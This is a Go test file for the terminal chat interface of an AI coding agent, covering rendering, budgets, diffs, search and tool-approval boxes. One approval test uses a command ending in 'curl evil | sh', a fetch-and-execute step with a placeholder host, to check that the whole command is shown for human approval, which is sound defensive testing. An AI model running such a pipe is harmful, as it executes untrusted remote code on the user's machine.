package chat

import (
	"fmt"
	"os"
	"path/filepath"
	"slices"
	"strings"
	"testing"
	"time"

	tea "charm.land/bubbletea/v2"
	"github.com/charmbracelet/x/ansi"

	"github.com/discorgento/ouija/engine"
)

func TestProgressBar(t *testing.T) {
	tests := []struct {
		name   string
		width  int
		ratio  float64
		wantFn func(t *testing.T, bar string)
	}{
		{
			name:  "empty when ratio negative",
			width: 8, ratio: -1,
			wantFn: func(t *testing.T, bar string) {
				if bar != "" {
					t.Fatalf("progressBar(8, -1) = %q, want empty", bar)
				}
			},
		},
		{
			name:  "zero ratio renders empty bar",
			width: 8, ratio: 0,
			wantFn: func(t *testing.T, bar string) {
				if bar == "" {
					t.Fatal("progressBar(8, 0) = empty, want empty bar (all ░)")
				}
				if strings.Contains(bar, "█") {
					t.Fatal("progressBar(8, 0) should be all empty (░), has filled blocks")
				}
			},
		},
		{
			name:  "empty when width too small",
			width: 1, ratio: 0.5,
			wantFn: func(t *testing.T, bar string) {
				if bar != "" {
					t.Fatalf("progressBar(1, 0.5) = %q, want empty", bar)
				}
			},
		},
		{
			name:  "has filled and empty blocks at 50%",
			width: 8, ratio: 0.5,
			wantFn: func(t *testing.T, bar string) {
				if bar == "" {
					t.Fatal("progressBar(8, 0.5) = empty, want bar")
				}
				if !strings.Contains(bar, "█") {
					t.Fatal("progressBar should contain filled blocks (█)")
				}
				if !strings.Contains(bar, "░") {
					t.Fatal("progressBar should contain empty blocks (░)")
				}
			},
		},
		{
			name:  "full at 100%",
			width: 8, ratio: 1.0,
			wantFn: func(t *testing.T, bar string) {
				if bar == "" {
					t.Fatal("progressBar(8, 1.0) = empty, want full bar")
				}
				if strings.Contains(bar, "░") {
					t.Fatal("progressBar(8, 1.0) should be fully filled, has empty blocks")
				}
			},
		},
		{
			name:  "clamps ratio above 1",
			width: 8, ratio: 2.0,
			wantFn: func(t *testing.T, bar string) {
				if bar == "" {
					t.Fatal("progressBar(8, 2.0) = empty, want clamped full bar")
				}
				if strings.Contains(bar, "░") {
					t.Fatal("progressBar(8, 2.0) should clamp to full, has empty blocks")
				}
			},
		},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			tc.wantFn(t, progressBar(tc.width, tc.ratio))
		})
	}
}

func TestBudgetUsage(t *testing.T) {
	usd1 := 1.0
	usd050 := 0.50
	tests := []struct {
		name      string
		tokens    int
		usd       float64
		maxUSD    *float64
		maxTokens int
		wantPct   float64
		wantLabel string
		wantOK    bool
	}{
		{name: "no budget", wantPct: 0, wantLabel: "", wantOK: false},
		{name: "usd budget", tokens: 0, usd: 0.25, maxUSD: &usd1, wantPct: 25, wantLabel: "$", wantOK: true},
		{name: "token budget", tokens: 300_000, maxTokens: 1_000_000, wantPct: 30, wantLabel: "", wantOK: true},
		{name: "usd precedes tokens", tokens: 999_999, usd: 0.10, maxUSD: &usd050, maxTokens: 1000, wantPct: 20, wantLabel: "$", wantOK: true},
		{name: "negative usd clamped", usd: -0.10, maxUSD: &usd1, wantPct: 0, wantLabel: "$", wantOK: true},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			pct, lbl, ok := budgetUsage(tc.tokens, tc.usd, tc.maxUSD, tc.maxTokens)
			if pct != tc.wantPct || lbl != tc.wantLabel || ok != tc.wantOK {
				t.Fatalf("budgetUsage(%d, %.2f, %v, %d) = %.0f %q %v, want %.0f %q %v",
					tc.tokens, tc.usd, tc.maxUSD, tc.maxTokens,
					pct, lbl, ok, tc.wantPct, tc.wantLabel, tc.wantOK)
			}
		})
	}
}

// Line breaks and indentation of a multi-line message survive wrapping.
func TestWrapLinesKeepsLineBreaks(t *testing.T) {
	got := wrapLines("line1\nline2\n    indented", "  ", 40)
	want := []string{"line1", "  line2", "      indented"}
	if !slices.Equal(got, want) {
		t.Fatalf("wrapLines = %q, want %q", got, want)
	}
}

// The screen is exactly as tall as the terminal in every state: one line more
// pushed the header off the top (the status bar's padding was not counted).
func TestViewFillsTheTerminalExactly(t *testing.T) {
	t.Setenv("XDG_CACHE_HOME", t.TempDir())
	const w, h = 100, 40
	m := newModel(&switchEngine{cfg: &engine.Config{Provider: "ollama", Model: "llama3", ContextWindow: 8192}}, nil, "", "")
	m.Update(tea.WindowSizeMsg{Width: w, Height: h})
	check := func(state string) {
		t.Helper()
		lines := strings.Split(m.View().Content, "\n")
		if len(lines) != h {
			t.Errorf("%s: %d lines, want %d", state, len(lines), h)
		}
		for i, l := range lines {
			if lw := ansi.StringWidth(l); lw > w {
				t.Errorf("%s: line %d is %d wide, want at most %d", state, i+1, lw, w)
			}
		}
	}
	check("welcome")

	m.waiting = true
	m.currentTool = "read_file: engine/budget.go"
	m.setViewportSize()
	check("waiting")
	m.waiting = false

	m.showApproval(approvalRequestMsg{tool: "edit_file", input: map[string]any{"path": "a.go", "_preview": "  @@ -1 +1 @@\n  -a\n  +b"}})
	check("approval")
	m.approvalReq = nil

	m.showCmdList = true
	m.setViewportSize()
	check("slash list")
	m.showCmdList = false

	diff := "  @@ -10,3 +10,3 @@\n  func f() {\n  -\treturn " + strings.Repeat("old ", 40) + "\n  +\treturn new\n  }"
	m.lines = append(m.lines,
		line{role: "trace", ts: "14:02", tools: engine.TurnSummary{Tools: []engine.TurnTool{
			{Name: "bash", Target: strings.Repeat("go test ", 30), Duration: time.Second, Error: strings.Repeat("exit status 1 ", 20)},
		}}},
		line{role: "diff", path: strings.Repeat("deep/", 30) + "file.go", text: diff, ts: "14:02"},
	)
	m.rebuildContent()
	m.showApproval(approvalRequestMsg{tool: "edit_file", input: map[string]any{"path": "a.go", "oldString": "x", "_preview": diff}})
	check("diff approval over a transcript with tools and a diff")
	m.approvalReq = nil

	m.input.SetValue(strings.Repeat("a long message that wraps ", 30))
	m.setViewportSize()
	check("multi-line input")

	for _, narrow := range []int{40, 64} {
		m.Update(tea.WindowSizeMsg{Width: narrow, Height: h})
		m.vp.GotoTop() // the welcome, tools and diff blocks, not just the input
		lines := strings.Split(m.View().Content, "\n")
		lines = append(lines, strings.Split(m.vp.GetContent(), "\n")...)
		for i, l := range lines {
			if lw := ansi.StringWidth(l); lw > narrow {
				t.Errorf("width %d: line %d is %d wide", narrow, i+1, lw)
			}
		}
		if n := strings.Count(m.View().Content, "\n") + 1; n != h {
			t.Errorf("width %d: %d lines, want %d", narrow, n, h)
		}
	}
}

// Markdown keeps its structure: list bullets, heading markers and the
// checkboxes of a task list (a /task plan is one; they used to vanish).
func TestGlamourKeepsListsAndHeadings(t *testing.T) {
	out := ansi.Strip(renderGlamourFull("## Budget\n\n- MaxTokens\n- MaxUSD\n\n- [ ] to do\n- [x] done", 60))
	for _, want := range []string{"## Budget", "• MaxTokens", "• MaxUSD", "☐ to do", "☑ done"} {
		if !strings.Contains(out, want) {
			t.Errorf("rendered markdown lacks %q:\n%s", want, out)
		}
	}
}

func TestFormatElapsedAndTokens(t *testing.T) {
	for d, want := range map[time.Duration]string{
		4*time.Minute + 12*time.Second: "4m12s",
		time.Hour + 4*time.Minute:      "1h04m",
		26 * time.Hour:                 "26h00m",
	} {
		if got := formatElapsed(d); got != want {
			t.Errorf("formatElapsed(%v) = %q, want %q", d, got, want)
		}
	}
	for n, want := range map[int]string{950: "950", 12_345: "12.3k", 200_000: "200k", 1_234_567: "1.2M", 2_000_000: "2M"} {
		if got := formatTokens(n); got != want {
			t.Errorf("formatTokens(%d) = %q, want %q", n, got, want)
		}
	}
}

// The welcome screen shows what the session runs with, read from the config.
func TestWelcomeShowsTheSession(t *testing.T) {
	usd := 2.0
	cfg := &engine.Config{Provider: "anthropic", Model: "claude-x", ContextWindow: 200_000, Budget: engine.Budget{MaxUSD: &usd}}
	out := ansi.Strip(renderWelcomeBanner(0, 100, -1, cfg, welcomeInfo{branch: "main", facts: 3}))
	for _, want := range []string{"claude-x", "anthropic", "200k tokens", "$2.00", "3 facts", "⎇ main", "/help"} {
		if !strings.Contains(out, want) {
			t.Errorf("welcome lacks %q:\n%s", want, out)
		}
	}
}

func TestGitBranch(t *testing.T) {
	root := t.TempDir()
	if got := gitBranch(root); got != "" {
		t.Fatalf("outside a repo: %q, want empty", got)
	}
	if err := os.MkdirAll(filepath.Join(root, ".git"), 0o755); err != nil {
		t.Fatal(err)
	}
	for head, want := range map[string]string{
		"ref: refs/heads/feat/x\n": "feat/x",
		"0123456789abcdef\n":       "0123456",
	} {
		if err := os.WriteFile(filepath.Join(root, ".git", "HEAD"), []byte(head), 0o644); err != nil {
			t.Fatal(err)
		}
		if got := gitBranch(root); got != want {
			t.Errorf("HEAD %q: branch %q, want %q", head, got, want)
		}
	}
}

// A card keeps its background after either reset spelling: the syntax
// highlighter writes \x1b[0m, lipgloss \x1b[m.
func TestKeepCardBGHandlesBothResets(t *testing.T) {
	out := keepCardBG("a\x1b[0mb\x1b[mc", "<bg>", "<fg>")
	if want := "a\x1b[m<fg><bg>b\x1b[m<fg><bg>c"; out != want {
		t.Fatalf("keepCardBG = %q, want %q", out, want)
	}
}

// The diff block numbers lines from the hunk header and counts the change.
func TestRenderDiffBlock(t *testing.T) {
	out := ansi.Strip(renderDiffBlock("a.go", "  @@ -10,3 +10,3 @@\n  ctx\n  -old\n  +new\n  after", 60))
	for _, want := range []string{"✎ a.go", "+1 −1", "10   ctx", "11 - old", "11 + new", "12   after"} {
		if !strings.Contains(out, want) {
			t.Errorf("diff block lacks %q:\n%s", want, out)
		}
	}
	for i, l := range strings.Split(out, "\n") {
		if w := ansi.StringWidth(l); w != 60 {
			t.Errorf("line %d is %d wide, want 60: %q", i+1, w, l)
		}
	}
}

// The tools block lists each call with its target and marks the failed one.
func TestRenderToolsBlock(t *testing.T) {
	if renderToolsBlock(engine.TurnSummary{}, 80, false) != nil {
		t.Fatal("a turn without tools renders a block")
	}
	out := ansi.Strip(strings.Join(renderToolsBlock(engine.TurnSummary{Tools: []engine.TurnTool{
		{Name: "read_file", Target: "a.go", Duration: 80 * time.Millisecond},
		{Name: "bash", Target: "go test", Duration: 2 * time.Second, Error: "exit status 1"},
	}}, 80, false), "\n"))
	for _, want := range []string{"2 tool calls", "read_file  a.go", "✓ 80ms", "bash", "go test", "✗ 2.0s", "└ exit status 1"} {
		if !strings.Contains(out, want) {
			t.Errorf("tools block lacks %q:\n%s", want, out)
		}
	}
}

// A toast shows in the status bar and clears itself — unless a newer one
// replaced it.
func TestToastClearsItself(t *testing.T) {
	m := newModel(&switchEngine{cfg: &engine.Config{}}, nil, "", "")
	m.Update(tea.WindowSizeMsg{Width: 100, Height: 30})
	m.toast("✓ first")
	first := m.toastID
	m.toast("✓ second")
	if !strings.Contains(ansi.Strip(m.View().Content), "✓ second") {
		t.Fatal("the toast is not in the status bar")
	}
	m.Update(toastClearMsg{id: first})
	if m.toastText != "✓ second" {
		t.Fatal("an older timer cleared a newer toast")
	}
	m.Update(toastClearMsg{id: m.toastID})
	if m.toastText != "" {
		t.Fatal("the toast stayed")
	}
}

// Lines that arrive while scrolled up are counted in the status bar.
func TestUnseenLinesPill(t *testing.T) {
	m := newModel(&switchEngine{cfg: &engine.Config{}}, nil, "", "")
	m.Update(tea.WindowSizeMsg{Width: 100, Height: 20})
	for range 30 {
		m.lines = append(m.lines, line{role: "user", text: "filler", ts: "10:00"})
	}
	m.rebuildContent()
	m.autoScroll = false
	m.vp.GotoTop()
	m.lines = append(m.lines, line{role: "assistant", text: "a", ts: "10:01"}, line{role: "assistant", text: "b", ts: "10:01"})
	m.rebuildContent()
	if out := ansi.Strip(m.View().Content); !strings.Contains(out, "↓ 2 new") {
		t.Fatalf("no unseen pill:\n%s", out)
	}
	m.autoScroll = true
	m.rebuildContent()
	if out := ansi.Strip(m.View().Content); strings.Contains(out, "new · End") {
		t.Fatal("the pill stayed at the bottom")
	}
}

// After the first message the welcome is one line.
func TestWelcomeCompactsAfterTheFirstMessage(t *testing.T) {
	m := newModel(&switchEngine{cfg: &engine.Config{Model: "m", Provider: "p"}}, nil, "", "")
	m.Update(tea.WindowSizeMsg{Width: 100, Height: 40})
	if !strings.Contains(ansi.Strip(m.vp.GetContent()), "◆ session") {
		t.Fatal("the full welcome is missing")
	}
	m.msgCount = 1
	m.rebuildContent()
	out := ansi.Strip(m.vp.GetContent())
	if strings.Contains(out, "◆ session") || !strings.Contains(out, "the board is listening") {
		t.Fatalf("welcome did not compact:\n%s", out)
	}
}

// A call still running shows as such in the live list, without the trace hint.
func TestLiveToolsBlock(t *testing.T) {
	out := ansi.Strip(strings.Join(renderToolsBlock(engine.TurnSummary{Tools: []engine.TurnTool{
		{Name: "read_file", Target: "a.go", Duration: time.Millisecond},
		{Name: "bash", Target: "go test"},
	}}, 80, true), "\n"))
	if !strings.Contains(out, "⋯ running") || strings.Contains(out, "Ctrl+T") {
		t.Fatalf("live block:\n%s", out)
	}
	if liveToolsKey(engine.TurnSummary{Tools: []engine.TurnTool{{Duration: 1}, {}}}) == liveToolsKey(engine.TurnSummary{Tools: []engine.TurnTool{{Duration: 1}, {Duration: 1}}}) {
		t.Fatal("a call finishing does not change the key")
	}
}

// The picker marks the value in use.
func TestPickerMarksCurrent(t *testing.T) {
	p := &Picker{}
	p.Show([]string{"A", "B"}, []string{"a", "b"}, "Models")
	p.Current = "b"
	out := ansi.Strip(p.Render(80))
	if !strings.Contains(out, "B  ● current") || strings.Contains(out, "A  ● current") {
		t.Fatalf("picker:\n%s", out)
	}
}

// The intro spells the name under a moving planchette, then the logo is whole.
func TestWelcomeIntro(t *testing.T) {
	cfg := &engine.Config{Model: "m", Provider: "p"}
	early := ansi.Strip(renderWelcomeBanner(0, 100, introReveal(2), cfg, welcomeInfo{}))
	if !strings.Contains(early, "◉") || strings.Contains(early, "the board is listening") {
		t.Fatalf("intro frame:\n%s", early)
	}
	if introReveal(introTicks) != -1 {
		t.Fatal("the intro does not end")
	}
	done := ansi.Strip(renderWelcomeBanner(0, 100, introReveal(introTicks), cfg, welcomeInfo{}))
	if strings.Contains(done, "◉") || !strings.Contains(done, "the board is listening") {
		t.Fatalf("after the intro:\n%s", done)
	}
}

// The exit card sums the session up, the changed files included.
func TestSessionSummary(t *testing.T) {
	m := newModel(&switchEngine{cfg: &engine.Config{}}, nil, "", "")
	m.msgCount = 2
	m.lines = []line{{role: "diff", path: "a.go"}, {role: "diff", path: "a.go"}, {role: "diff", path: "b.go"}}
	out := ansi.Strip(renderSessionSummary(m, &engine.Config{Model: "claude-x", Provider: "anthropic"}, 12_345, 4, 0.12))
	for _, want := range []string{"messages  2", "12.3k · 4 steps", "claude-x · anthropic", "$0.12", "2 file(s)", "✎ a.go", "✎ b.go"} {
		if !strings.Contains(out, want) {
			t.Errorf("summary lacks %q:\n%s", want, out)
		}
	}
}

// /changes sums each file's edits; /retry drops the last reply and asks again.
func TestChangesAndRetry(t *testing.T) {
	m := newModel(&switchEngine{cfg: &engine.Config{}}, nil, "", "")
	if got := m.sessionChanges(); !strings.Contains(got, "No files changed") {
		t.Fatalf("no changes: %q", got)
	}
	m.lines = []line{
		{role: "user", text: "fix it"},
		{role: "assistant", text: "done"},
		{role: "diff", path: "a.go", text: "  @@ -1 +1 @@\n  -a\n  +b"},
		{role: "diff", path: "a.go", text: "  @@ -1 +1 @@\n  +c"},
	}
	if got := m.sessionChanges(); !strings.Contains(got, "`a.go` +2 −1 · 2 edits") {
		t.Fatalf("changes: %q", got)
	}
	m.history = []engine.Message{{Role: engine.RoleUser, Content: "fix it"}, {Role: engine.RoleAssistant, Content: "done"}}
	m.retryLast()
	if len(m.lines) != 1 || m.lines[0].text != "fix it" || len(m.history) != 0 || !m.waiting {
		t.Fatalf("after /retry: lines %+v, history %+v, waiting %v", m.lines, m.history, m.waiting)
	}
}

// Ctrl+F highlights the matches, steps through them, and Esc gives the draft
// back.
func TestSearch(t *testing.T) {
	m := newModel(&switchEngine{cfg: &engine.Config{}}, nil, "", "")
	m.Update(tea.WindowSizeMsg{Width: 100, Height: 30})
	m.lines = []line{{role: "assistant", text: "the zebra is here", ts: "10:00"}, {role: "assistant", text: "another ZEBRA", ts: "10:01"}}
	m.rebuildContent()
	m.input.SetValue("my draft")
	m.Update(tea.KeyPressMsg{Code: 'f', Mod: tea.ModCtrl})
	if !m.search.active || m.input.Value() != "" {
		t.Fatal("Ctrl+F did not open the search box")
	}
	for _, r := range "zebra" {
		m.Update(tea.KeyPressMsg{Code: r, Text: string(r)})
	}
	if m.search.matches != 2 {
		t.Fatalf("matches = %d, want 2 (case-insensitive)", m.search.matches)
	}
	if !strings.Contains(ansi.Strip(m.View().Content), "1/2") {
		t.Fatal("the status bar does not count the matches")
	}
	m.Update(tea.KeyPressMsg{Code: tea.KeyEnter})
	if m.search.current != 1 {
		t.Fatalf("current = %d after Enter, want 1", m.search.current)
	}
	m.Update(tea.KeyPressMsg{Code: tea.KeyEscape})
	if m.search.active || m.input.Value() != "my draft" {
		t.Fatalf("Esc: active %v, input %q", m.search.active, m.input.Value())
	}
}

// The user's message is a bubble on the right.
func TestUserBubbleIsOnTheRight(t *testing.T) {
	out := ansi.Strip(renderUserBubble("hello", "10:00", "", 80))
	for _, l := range strings.Split(out, "\n") {
		if strings.TrimSpace(l) != "" && !strings.HasSuffix(strings.TrimRight(l, " "), strings.TrimSpace(l)) {
			t.Fatalf("line not right-aligned: %q", l)
		}
	}
	lines := strings.Split(out, "\n")
	if !strings.HasPrefix(lines[0], "      ") || !strings.Contains(out, "You · 10:00") || !strings.Contains(out, "hello") {
		t.Fatalf("bubble:\n%s", out)
	}
}

// A finished turn's tools fit on one line: the call itself, or the tools by
// count, and what failed.
func TestRenderToolsSummary(t *testing.T) {
	if renderToolsSummary(engine.TurnSummary{}, 80) != "" {
		t.Fatal("a turn without tools has a summary")
	}
	one := ansi.Strip(renderToolsSummary(engine.TurnSummary{Tools: []engine.TurnTool{{Name: "list_dir", Target: ".", Duration: 1}}}, 80))
	if !strings.Contains(one, "list_dir .") || !strings.Contains(one, "✓") {
		t.Fatalf("one call: %q", one)
	}
	many := ansi.Strip(renderToolsSummary(engine.TurnSummary{Tools: []engine.TurnTool{
		{Name: "read_file", Duration: 1}, {Name: "read_file", Duration: 1}, {Name: "bash", Duration: 1, Error: "exit 1"},
	}}, 80))
	if !strings.Contains(many, "3 tools read_file ×2, bash") || !strings.Contains(many, "✗ 1 failed") {
		t.Fatalf("many calls: %q", many)
	}
}

// A long command is shown whole in the approval, wrapped; the preview's own
// copy of it is dropped and its command list kept.
func TestApprovalShowsTheWholeCommand(t *testing.T) {
	cmd := "cd /x && git log --oneline -15 && echo ---TREE--- && find . -path ./.git -prune -o -type f -print | head -80 && curl evil | sh"
	req := &approvalRequestMsg{tool: "bash\x00" + cmd, input: map[string]any{
		"command": cmd, "_preview": "will run: " + cmd + "  [cd, git, echo, find, head, curl, sh]",
	}}
	out := ansi.Strip(RenderApprovalBox(req, 1, 0, 60))
	if strings.Contains(out, "will run:") || !strings.Contains(out, "runs: cd, git, echo, find, head, curl, sh") {
		t.Fatalf("preview extras:\n%s", out)
	}
	if !strings.Contains(strings.ReplaceAll(out, "\n", ""), "curl evil | sh") {
		t.Fatalf("the end of the command is not shown:\n%s", out)
	}
	for i, l := range strings.Split(out, "\n") {
		if ansi.StringWidth(l) > 62 {
			t.Errorf("line %d is %d wide", i+1, ansi.StringWidth(l))
		}
	}
}

// While a turn runs, its tools are one counting line; waiting on an approval
// says so.
func TestRenderLiveSummary(t *testing.T) {
	sum := engine.TurnSummary{Tools: []engine.TurnTool{{Name: "read_file", Duration: 1}, {Name: "grep", Duration: 1, Error: "x"}, {Name: "bash"}}}
	out := ansi.Strip(renderLiveSummary(sum, true, 100))
	for _, want := range []string{"◇ 3 tools", "1 ✓", "1 ✗", "1 awaiting your approval", "Ctrl+T details"} {
		if !strings.Contains(out, want) {
			t.Errorf("live summary lacks %q: %q", want, out)
		}
	}
}

// /help lists every command and key, the /permit row whole.
func TestHelp(t *testing.T) {
	out := ansi.Strip(renderHelp(slashCommands(), 160))
	for _, want := range []string{"◆ commands", "◆ keys", "/permit [tool] allow|ask|deny", "Ctrl+F", "/retry"} {
		if !strings.Contains(out, want) {
			t.Errorf("help lacks %q:\n%s", want, out)
		}
	}
	for i, l := range strings.Split(ansi.Strip(renderHelp(slashCommands(), 70)), "\n") {
		if ansi.StringWidth(l) > 70 {
			t.Errorf("narrow help line %d is %d wide", i+1, ansi.StringWidth(l))
		}
	}
}

// The streaming redraw shows the same screen as a full rebuild, and the full
// transcript comes back before a scroll.
func TestStreamingRedrawMatchesTheFullOne(t *testing.T) {
	m := newModel(&switchEngine{cfg: &engine.Config{}}, nil, "", "")
	m.Update(tea.WindowSizeMsg{Width: 100, Height: 30})
	for i := range 40 {
		m.lines = append(m.lines, line{role: "assistant", text: fmt.Sprintf("reply %d\n\n- a\n- b", i), ts: "10:00"})
	}
	m.msgCount = 1
	m.rebuildContent()
	m.waiting = true
	m.partialText = "First paragraph.\n\nSecond, **still** streaming"
	m.rebuildContent()
	full := m.vp.View() // the transcript area (the status line moves by itself)
	m.rebuildStreaming()
	if !m.vpTail {
		t.Fatal("the streaming redraw did not use the tail")
	}
	if got := m.vp.View(); got != full {
		t.Fatalf("streaming screen differs from the full one:\n--- full\n%s\n--- streaming\n%s", ansi.Strip(full), ansi.Strip(got))
	}
	m.fullTranscript()
	if m.vpTail || !strings.Contains(ansi.Strip(m.vp.GetContent()), "reply 0") {
		t.Fatal("fullTranscript did not restore the whole transcript")
	}
}

// Complete paragraphs settle at the last blank line outside a code fence.
func TestSettledMarkdown(t *testing.T) {
	for text, want := range map[string]int{
		"one line":                0,
		"para one\n\npara two":    len("para one\n\n"),
		"para\n\n```go\nx\n\ny\n": len("para\n\n"),
		"a\n\nb\n\n":              0,
		"```\ncode\n```\n\nafter": len("```\ncode\n```\n\n"),
	} {
		if got := settledMarkdown(text); got != want {
			t.Errorf("settledMarkdown(%q) = %d, want %d", text, got, want)
		}
	}
}

// Paths link to the file (OSC 8) without changing what is shown.
func TestFileLink(t *testing.T) {
	old := linkRoot
	t.Cleanup(func() { linkRoot = old })
	linkRoot = "/proj"
	got := fileLink("engine/a b.go", "a b.go")
	if want := "\x1b]8;;file:///proj/engine/a%20b.go\x07a b.go\x1b]8;;\x07"; got != want {
		t.Fatalf("fileLink = %q, want %q", got, want)
	}
	if ansi.StringWidth(got) != len("a b.go") {
		t.Fatal("the link changes the width")
	}
	linkRoot = ""
	if fileLink("rel.go", "rel.go") != "rel.go" {
		t.Fatal("a relative path without a root got a link")
	}
}

// The status bar's tip changes as the session goes on, and comes round again.
func TestTipsRotate(t *testing.T) {
	if currentTip(0) == currentTip(tipEvery) {
		t.Fatal("the tip did not change")
	}
	if currentTip(0) != currentTip(tipEvery*time.Duration(len(tips))) {
		t.Fatal("the tips do not cycle")
	}
}

// From sideBySideWidth on, removed and added lines sit side by side, each
// side numbered from its own file; the code is highlighted.
func TestDiffSideBySide(t *testing.T) {
	diff := "  @@ -10,4 +10,5 @@\n  func f() {\n  -\treturn old\n  +\tx := 1\n  +\treturn new\n  }"
	out := renderDiffBlock("a.go", diff, 160)
	plain := ansi.Strip(out)
	var row string
	for _, l := range strings.Split(plain, "\n") {
		if strings.Contains(l, "return old") {
			row = l
		}
	}
	if !strings.Contains(row, "11 - ") || !strings.Contains(row, "11 + ") || !strings.Contains(row, "x := 1") {
		t.Fatalf("old and new are not side by side:\n%s", plain)
	}
	for i, l := range strings.Split(plain, "\n") {
		if w := ansi.StringWidth(l); w != 160 {
			t.Errorf("line %d is %d wide, want 160", i+1, w)
		}
	}
	if !strings.Contains(out, "\x1b[1m\x1b[38;2;175;135;255mreturn") && !strings.Contains(out, "175;135;255") {
		t.Errorf("the Go keyword is not highlighted")
	}
	pairs := sideBySide(parseDiff(diff))
	if len(pairs) != 5 || pairs[2].left == nil || pairs[3].left != nil || pairs[3].right == nil {
		t.Fatalf("pairs = %+v", pairs)
	}
}

// Ctrl+R lists the messages sent, filters them as you type, and Enter puts
// the chosen one in the input box; Esc gives the draft back.
func TestHistorySearch(t *testing.T) {
	m := newModel(&switchEngine{cfg: &engine.Config{}}, nil, "", "")
	m.Update(tea.WindowSizeMsg{Width: 100, Height: 30})
	m.inputHistory = []string{"explain the budget", "run the tests", "fix the budget bar"}
	m.input.SetValue("draft")
	m.Update(tea.KeyPressMsg{Code: 'r', Mod: tea.ModCtrl})
	if m.histSearch == nil || m.picker.Label != historyPickerLabel || m.picker.Items[0] != "fix the budget bar" {
		t.Fatalf("not open: %+v %v", m.histSearch, m.picker.Items)
	}
	for _, r := range "budg" {
		m.Update(tea.KeyPressMsg{Code: r, Text: string(r)})
	}
	if len(m.picker.Items) != 2 {
		t.Fatalf("filtered = %v", m.picker.Items)
	}
	m.Update(tea.KeyPressMsg{Code: tea.KeyDown})
	m.Update(tea.KeyPressMsg{Code: tea.KeyEnter})
	if m.histSearch != nil || m.input.Value() != "explain the budget" {
		t.Fatalf("after Enter: %q", m.input.Value())
	}
	m.Update(tea.KeyPressMsg{Code: 'r', Mod: tea.ModCtrl})
	m.Update(tea.KeyPressMsg{Code: tea.KeyEscape})
	if m.input.Value() != "explain the budget" {
		t.Fatalf("Esc lost the draft: %q", m.input.Value())
	}
}

// A failed command shows why and how it ended even with the details closed;
// the details show every command's last lines.
func TestFailedCommandOutput(t *testing.T) {
	m := newModel(&switchEngine{cfg: &engine.Config{}}, nil, "", "")
	l := &line{role: "assistant", tools: engine.TurnSummary{Tools: []engine.TurnTool{
		{Name: "bash", Target: "go build", Duration: 1, Output: "ok"},
		{Name: "bash", Target: "go test ./...", Duration: 1, Error: "exit status 1", Output: "line1\nline2\n--- FAIL: TestX\nFAIL\tpkg"},
	}}}
	closed := ansi.Strip(strings.Join(m.renderTurnTools(l, 80), "\n"))
	for _, want := range []string{"✗ 1 failed", "✗ bash go test ./...  exit status 1", "│ --- FAIL: TestX", "│ FAIL    pkg"} {
		if !strings.Contains(closed, want) {
			t.Errorf("closed view lacks %q:\n%s", want, closed)
		}
	}
	if strings.Contains(closed, "line1") || strings.Contains(closed, "│ ok") {
		t.Errorf("closed view shows too much:\n%s", closed)
	}
	m.showTrace = true
	open := ansi.Strip(strings.Join(m.renderTurnTools(l, 80), "\n"))
	if !strings.Contains(open, "│ ok") || !strings.Contains(open, "│ line1") {
		t.Errorf("details lack the outputs:\n%s", open)
	}
}

// The approval of a file to be written shows its content, numbered and
// framed, instead of the raw argument.
func TestApprovalShowsTheNewFile(t *testing.T) {
	content := "package main\n\nfunc main() {}\n"
	req := &approvalRequestMsg{tool: "write_file\x00/p/main.go", input: map[string]any{
		"path": "main.go", "content": content, "_preview": "will create main.go (3 lines, 28 bytes)",
	}}
	out := ansi.Strip(RenderApprovalBox(req, 1, 0, 70))
	for _, want := range []string{"✎ main.go", "+3 lines", "1 + package main", "3 + func main() {}", "will create main.go"} {
		if !strings.Contains(out, want) {
			t.Errorf("approval lacks %q:\n%s", want, out)
		}
	}
	if strings.Contains(out, "content:") {
		t.Errorf("the raw content argument is shown too:\n%s", out)
	}
	long := strings.Repeat("x\n", 40)
	if p := ansi.Strip(renderFilePreview("a.txt", long, 60)); !strings.Contains(p, "… 16 more lines") {
		t.Errorf("long file not cut:\n%s", p)
	}
}
